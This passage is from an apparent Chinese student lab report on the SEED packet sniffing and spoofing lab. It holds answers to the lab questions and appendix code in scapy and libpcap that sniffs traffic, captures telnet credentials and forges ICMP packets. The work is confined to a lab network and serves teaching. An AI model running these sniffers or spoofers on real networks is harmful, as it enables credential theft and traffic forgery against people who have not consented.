<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180933482.png"></p>
<p>可以发现在主机B中，只发送了3个ping请求报文，但是却收到了6个响应报文，并且在攻击者主机中嗅探中，可以发现每次嗅探到一个请求报文，就会伪造一份响应报文，证明伪造成功。</p>
<h3 id="4-2-Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets"><a href="#4-2-Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets" class="headerlink" title="4.2 Lab Task Set 2: Writing Programs to Sniff and Spoof Packets"></a>4.2 Lab Task Set 2: Writing Programs to Sniff and Spoof Packets</h3><h4 id="4-2-1-Writing-Packet-Sniffing-Program"><a href="#4-2-1-Writing-Packet-Sniffing-Program" class="headerlink" title="4.2.1 Writing Packet Sniffing Program"></a>4.2.1 Writing Packet Sniffing Program</h4><p>Task 2.1A: Understanding How a Sniffer Works</p>
<p>运行结果如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180935811.png"></p>
<p>问题回答：</p>
<p>A1：首先调用pcap对指定的enps03网卡进行监听，然后在过滤器中设置过滤规则，最后进行数据包的捕获。</p>
<p>A2：嗅探数据报涉及到隐私安全的问题，如果任何用户都可以执行这一操作，便可以通过嗅探到的数据进行分析，从而获取他人隐私，显然是不安全的。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180936659.png"></p>
<p>A3： 打开混在模式可以监听网段下其他网卡发送的数据包，如果关闭就只能够监听到本机的数据包。</p>
<p>Task 2.1B: Writing Filters</p>
<p>捕获两个特定主机间的icmp数据包</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180936121.png"></p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180937097.png"></p>
<p>捕获目的端口为10-100的tcp数据包</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180937901.png"></p>
<p>Task 2.1C: Sniffing Passwords</p>
<p>在攻击者主机中执行嗅探程序，同时在主机A中执行telnet 10.9.0.6 的命令，在此过程中需要输入用户名和密码，通过嗅探程序可以截获并且打印数据包，从而得到并破解用户的密码。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180940071.png"></p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180940582.png"></p>
<p>在截获过程中，观察到login后面得到的数据为sseeeedd，password后面得到的数据为dees，而主机本身的用户名为seed，密码为dees，证明截获到了正确的数据包，对用户名和密码捕获成功。</p>
<h4 id="4-2-2-Spoofing"><a href="#4-2-2-Spoofing" class="headerlink" title="4.2.2 Spoofing"></a>4.2.2 Spoofing</h4><p>执行伪造程序，并且利用wireshark进行抓包，可以成功捕获到数据包，证明伪造数据包发送成功。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180940700.png"></p>
<p>问题回答：</p>
<p>A4：可以随机设置报文头中的报文长度，但需要保证向socket发送的原始报文是正确的长度，否则可能会导致发送出的报文检验和不匹配从而无法收到回显报文。</p>
<p>A5：必须计算检验和，如按照默认的0x00，会导致报文在终点服务器检验不通过，从而被丢弃导致伪造失败。</p>
<p>A6：没有权限的用户不可以执行数据包的截获，发送等行为。</p>
<h4 id="4-2-3-Sniff-and-then-Spoof"><a href="#4-2-3-Sniff-and-then-Spoof" class="headerlink" title="4.2.3 Sniff and then Spoof"></a>4.2.3 Sniff and then Spoof</h4><p>首先在主机A上进行ping google,com ，发现无法连通，并且没有响应数据包</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180941177.png"></p>
<p>然后在攻击者主机中执行嗅探和伪造程序，再一次在主机A中执行ping google.com命令，可以得到如下运行结果：</p>
<p>可以观察到在主机A中可以成功收到icmp响应数据包，说明嗅探和伪造成功。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180942823.png"></p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180942271.png"></p>
<h2 id="五-附件"><a href="#五-附件" class="headerlink" title="五.附件"></a>五.附件</h2><p>Task1.1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_pkt</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n==================packet:&#123;&#125;===================\n&quot;</span>.<span class="keyword">for</span></span><br><span class="line">    mat(num))</span><br><span class="line">    pkt.show()</span><br><span class="line">    pkt = sniff(iface = <span class="string">&#x27;br-4ceb30c2d898&#x27;</span>,<span class="built_in">filter</span>=<span class="string">&#x27;src net 10.0.0.0/16&#x27;</span>,prn=print_pkt)</span><br></pre></td></tr></table></figure>



<p>Task1.2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">    a =IP()</span><br><span class="line">    a.dst = <span class="string">&#x27;1.2.3.4&#x27;</span></span><br><span class="line">    b = ICMP()</span><br><span class="line">    p = a/b</span><br><span class="line">    ls(a)</span><br><span class="line">    send(p,iface = <span class="string">&#x27;enp0s3&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>Task1.3</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">a= IP()</span><br><span class="line">a.dst=<span class="string">&#x27;baidu.com&#x27;</span></span><br><span class="line">a.ttl =<span class="number">15</span></span><br><span class="line">b= ICMP()</span><br><span class="line"><span class="comment"># send(a/b)</span></span><br><span class="line">a = sr1(a/b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Source:&quot;</span>,a.src)</span><br></pre></td></tr></table></figure>



<p>Task1.4</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_pkt</span>(<span class="params">pkt</span>):</span><br><span class="line"><span class="comment"># sniff and print out icmp echo request packet</span></span><br><span class="line">     <span class="keyword">if</span> ICMP <span class="keyword">in</span> pkt <span class="keyword">and</span> pkt[ICMP].<span class="built_in">type</span> == <span class="number">8</span>:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;Original Packet.........&quot;</span>)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;Source IP : &quot;</span>, pkt[IP].src)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;Destination IP :&quot;</span>, pkt[IP].dst)</span><br><span class="line">         <span class="comment"># spoof an icmp echo reply packet</span></span><br><span class="line">         <span class="comment"># swap srcip and dstip</span></span><br><span class="line">         ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)</span><br><span class="line">         icmp = ICMP(<span class="built_in">type</span>=<span class="number">0</span>, <span class="built_in">id</span>=pkt[ICMP].<span class="built_in">id</span>, seq=pkt[ICMP].seq)</span><br><span class="line">         data = pkt[Raw].load</span><br><span class="line">         newpkt = ip/icmp/data</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;Spoofed Packet.........&quot;</span>)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;Source IP : &quot;</span>, newpkt[IP].src)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;Destination IP :&quot;</span>, newpkt[IP].dst)</span><br><span class="line">         send(newpkt, verbose=<span class="number">0</span>)</span><br><span class="line">pkt = sniff(iface = <span class="string">&#x27;vetha6b71be&#x27;</span>,<span class="built_in">filter</span>=<span class="built_in">filter</span>, prn=spoof_pkt)</span><br></pre></td></tr></table></figure>



<p>Task2.1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">got_packet</span><span class="params">(u_char *args, <span class="type">const</span> <span class="keyword">struct</span> pcap_pkthdr *header,<span class="type">const</span> u_char *packet)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Got a packet\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">pcap_t</span> *handle;</span><br><span class="line"> <span class="type">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_program</span> <span class="title">fp</span>;</span></span><br><span class="line"> <span class="type">char</span> filter_exp[] = <span class="string">&quot;icmp&quot;</span>;</span><br><span class="line"> bpf_u_int32 net;</span><br><span class="line"> <span class="comment">// Step 1: Open live pcap session on NIC with name enp0s3</span></span><br><span class="line"> handle = pcap_open_live(<span class="string">&quot;enp0s3&quot;</span>, BUFSIZ, <span class="number">1</span>, <span class="number">1000</span>, errbuf);</span><br><span class="line"> <span class="comment">// Step 2: Compile filter_exp into BPF psuedo-code</span></span><br><span class="line"> pcap_compile(handle, &amp;fp, filter_exp, <span class="number">0</span>, net);</span><br><span class="line"> <span class="keyword">if</span> (pcap_setfilter(handle, &amp;fp) !=<span class="number">0</span>) &#123;</span><br><span class="line">     pcap_perror(handle, <span class="string">&quot;Error:&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">// Step 3: Capture packets</span></span><br><span class="line"> pcap_loop(handle, <span class="number">-1</span>, got_packet, <span class="literal">NULL</span>);</span><br><span class="line"> pcap_close(handle); <span class="comment">//Close the handle</span></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Task2.2</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="comment">/* Ethernet header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ethheader</span> &#123;</span></span><br><span class="line">    u_char ether_dhost[<span class="number">6</span>]; <span class="comment">/* destination host address */</span></span><br><span class="line">    u_char ether_shost[<span class="number">6</span>]; <span class="comment">/* source host address */</span></span><br><span class="line">    u_short ether_type; <span class="comment">/* IP? ARP? RARP? etc */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* IP Header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> iph_ihl:<span class="number">4</span>, <span class="comment">//IP header length</span></span><br><span class="line">    iph_ver:<span class="number">4</span>; <span class="comment">//IP version</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> iph_tos; <span class="comment">//Type of service</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_len; <span class="comment">//IP Packet length (data + header)</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_ident; <span class="comment">//Identification</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_flag:<span class="number">3</span>, <span class="comment">//Fragmentation flags</span></span><br><span class="line">    iph_offset:<span class="number">13</span>; <span class="comment">//Flags offset</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> iph_ttl; <span class="comment">//Time to Live</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> iph_protocol; <span class="comment">//Protocol type</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_chksum; <span class="comment">//IP datagram checksum</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">iph_sourceip</span>;</span> <span class="comment">//Source IP address</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">iph_destip</span>;</span> <span class="comment">//Destination IP address</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* ICMP Header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">icmpheader</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> icmp_type; <span class="comment">// ICMP message type</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> icmp_code; <span class="comment">// Error code</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> icmp_chksum; <span class="comment">//Checksum for ICMP Header and data</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> icmp_id; <span class="comment">//Used for identifying request</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> icmp_seq; <span class="comment">//Sequence number</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">udpheader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">u_int16_t</span> udp_sport; <span class="comment">/* source port */</span></span><br><span class="line">    <span class="type">u_int16_t</span> udp_dport; <span class="comment">/* destination port */</span></span><br><span class="line">    <span class="type">u_int16_t</span> udp_ulen; <span class="comment">/* udp length */</span></span><br><span class="line">    <span class="type">u_int16_t</span> udp_sum; <span class="comment">/* udp checksum */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* TCP Header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcpheader</span> &#123;</span></span><br><span class="line">    u_short tcp_sport; <span class="comment">/* source port */</span></span><br><span class="line">    u_short tcp_dport; <span class="comment">/* destination port */</span></span><br><span class="line">    u_int tcp_seq; <span class="comment">/* sequence number */</span></span><br><span class="line">    u_int tcp_ack; <span class="comment">/* acknowledgement number */</span></span><br><span class="line">    u_char tcp_offx2; <span class="comment">/* data offset, rsvd */</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_OFF(th) (((th)-&gt;tcp_offx2 &amp; 0xf0) &gt;&gt; 4)</span></span><br><span class="line">    u_char tcp_flags;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_FIN 0x01</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_SYN 0x02</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_RST 0x04</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_PUSH 0x08</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_ACK 0x10</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_URG 0x20</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_ECE 0x40</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_CWR 0x80</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_FLAGS</span></span><br><span class="line">    (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)</span><br><span class="line">    u_short tcp_win; <span class="comment">/* window */</span></span><br><span class="line">    u_short tcp_sum; <span class="comment">/* checksum */</span></span><br><span class="line">    u_short tcp_urp; <span class="comment">/* urgent pointer */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* Psuedo TCP header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pseudo_tcp</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> saddr, daddr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> mbz;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ptcl;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> tcpl;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcpheader</span> <span class="title">tcp</span>;</span></span><br><span class="line">    <span class="type">char</span> payload[<span class="number">1500</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="title function_">in_cksum</span> <span class="params">(<span class="type">unsigned</span> <span class="type">short</span> *buf, <span class="type">int</span> length)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_raw_ip_packet</span><span class="params">(<span class="keyword">struct</span> ipheader* ip)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="title function_">in_cksum</span> <span class="params">(<span class="type">unsigned</span> <span class="type">short</span> *buf, <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> *w = buf;</span><br><span class="line">    <span class="type">int</span> nleft = length;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> temp=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The algorithm uses a 32 bit accumulator (sum), adds</span></span><br><span class="line"><span class="comment"> * sequential 16 bit words to it, and at the end, folds back all</span></span><br><span class="line"><span class="comment"> * the carry bits from the top 16 bits into the lower 16 bits.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">while</span> (nleft &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        sum += *w++;</span><br><span class="line">        nleft -= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* treat the odd byte at the end, if any */</span></span><br><span class="line">    <span class="keyword">if</span> (nleft == <span class="number">1</span>) &#123;</span><br><span class="line">        *(u_char *)(&amp;temp) = *(u_char *)w ;</span><br><span class="line">        sum += temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* add back carry outs from top 16 bits to low 16 bits */</span></span><br><span class="line">    sum = (sum &gt;&gt; <span class="number">16</span>) + (sum &amp; <span class="number">0xffff</span>); <span class="comment">// add hi 16 to low 16</span></span><br><span class="line">    sum += (sum &gt;&gt; <span class="number">16</span>); <span class="comment">// add carry</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">short</span>)(~sum);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_raw_ip_packet</span><span class="params">(<span class="keyword">struct</span> ipheader* ip)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_info</span>;</span></span><br><span class="line">    <span class="type">int</span> enable = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// Step 1: Create a raw network socket.</span></span><br><span class="line">    <span class="type">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line">    <span class="comment">// Step 2: Set socket option.</span></span><br><span class="line">    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,</span><br><span class="line">               &amp;enable, <span class="keyword">sizeof</span>(enable));</span><br><span class="line">    <span class="comment">// Step 3: Provide needed information about destination.</span></span><br><span class="line">    dest_info.sin_family = AF_INET;</span><br><span class="line">    dest_info.sin_addr = ip-&gt;iph_destip;</span><br><span class="line">    <span class="comment">// Step 4: Send the packet out.</span></span><br><span class="line">    sendto(sock, ip, ntohs(ip-&gt;iph_len), <span class="number">0</span>,</span><br><span class="line">           (<span class="keyword">struct</span> sockaddr *)&amp;dest_info, <span class="keyword">sizeof</span>(dest_info));</span><br><span class="line">    close(sock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/******************************************************************</span></span><br><span class="line"><span class="comment"> Spoof an ICMP echo request using an arbitrary source IP Address</span></span><br><span class="line"><span class="comment">*******************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1500</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">1500</span>);</span><br><span class="line">    <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment"> Step 1: Fill in the ICMP header.</span></span><br><span class="line"><span class="comment"> ********************************************************/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmpheader</span> *<span class="title">icmp</span> =</span> (<span class="keyword">struct</span> icmpheader *)</span><br><span class="line">        (buffer + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader));</span><br><span class="line">    icmp-&gt;icmp_type = <span class="number">8</span>; <span class="comment">//ICMP Type: 8 is request, 0 is reply.</span></span><br><span class="line">    <span class="comment">// Calculate the checksum for integrity</span></span><br><span class="line">    icmp-&gt;icmp_chksum = <span class="number">0</span>;</span><br><span class="line">    icmp-&gt;icmp_chksum = in_cksum((<span class="type">unsigned</span> <span class="type">short</span> *)icmp,</span><br><span class="line">                                 <span class="keyword">sizeof</span>(<span class="keyword">struct</span> icmpheader));</span><br><span class="line">    <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment"> Step 2: Fill in the IP header.</span></span><br><span class="line"><span class="comment"> ********************************************************/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">ip</span> =</span> (<span class="keyword">struct</span> ipheader *) buffer;</span><br><span class="line">    ip-&gt;iph_ver = <span class="number">4</span>;</span><br><span class="line">    ip-&gt;iph_ihl = <span class="number">5</span>;</span><br><span class="line">    ip-&gt;iph_ttl = <span class="number">20</span>;</span><br><span class="line">    ip-&gt;iph_sourceip.s_addr = inet_addr(<span class="string">&quot;10.9.0.5&quot;</span>);</span><br><span class="line">    ip-&gt;iph_destip.s_addr = inet_addr(<span class="string">&quot;8.8.8.8&quot;</span>);</span><br><span class="line">    ip-&gt;iph_protocol = IPPROTO_ICMP;</span><br><span class="line">    ip-&gt;iph_len = htons(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader) +<span class="keyword">sizeof</span>(<span class="keyword">struct</span> icmpheader));</span><br><span class="line">    <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment"> Step 3: Finally, send the spoofed packet</span></span><br><span class="line"><span class="comment"> ********************************************************/</span></span><br><span class="line">    send_raw_ip_packet (ip);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Task2.3</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> APP_NAME <span class="string">&quot;sniffex&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> APP_DESC <span class="string">&quot;sniffer example using libcap&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> APP_COPYRIGHT <span class="string">&quot;COPY&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> APP_DISCLAIMER <span class="string">&quot;NO WARNNING&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in_systm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip_icmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SNAP_LEN 1518</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_ETHERNET 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ETHER_ADDR_LEN 6</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sniff_ethernet</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u_char ether_dhost[ETHER_ADDR_LEN];</span><br><span class="line">    u_char ether_shost[ETHER_ADDR_LEN];</span><br><span class="line">    u_short ether_type;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sniff_ip</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u_char ip_vhl;</span><br><span class="line">    u_char ip_tos;</span><br><span class="line">    u_short ip_len;</span><br><span class="line">    u_short ip_id;</span><br><span class="line">    u_short ip_off;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> IP_RF 0x8000</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> IP_DF 0x4000</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> IP_MF 0x2000</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> IP_OFFMASK 0x1ffff</span></span><br><span class="line">    u_char ip_ttl;</span><br><span class="line">    u_char ip_p;</span><br><span class="line">    u_char ip_sum;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">ip_src</span>,<span class="title">ip_dst</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IP_HL(ip) (((ip)-&gt;ip_vhl) &amp; 0x0f)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IP_V(ip) (((ip)-&gt;ip_vhl) &gt;&gt;4)</span></span><br><span class="line"><span class="keyword">typedef</span> u_int tcp_seq;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sniff_tcp</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u_short th_sport;</span><br><span class="line">    u_short th_dport;</span><br><span class="line">    tcp_seq th_seq;</span><br><span class="line">    tcp_seq th_ack;</span><br><span class="line">    u_char th_offx2;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_OFF(th) (((th)-&gt;th_offx2 &amp; 0xf0) &gt;&gt;4 )</span></span><br><span class="line">    u_char th_flags;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_FIN 0x01</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_SYN 0x02</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_RST 0x04</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_PUSH 0x08</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_ACK 0x10</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_URG 0x20</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_ECE 0x40</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_CWR 0x80</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_FLAGS</span></span><br><span class="line">    (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)</span><br><span class="line">    u_short th_win;</span><br><span class="line">    u_short th_sum;</span><br><span class="line">    u_short th_urp;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sniff_icmp</span> &#123;</span></span><br><span class="line">    u_char icmp_type;</span><br><span class="line">    u_char icmp_code;</span><br><span class="line">    u_short 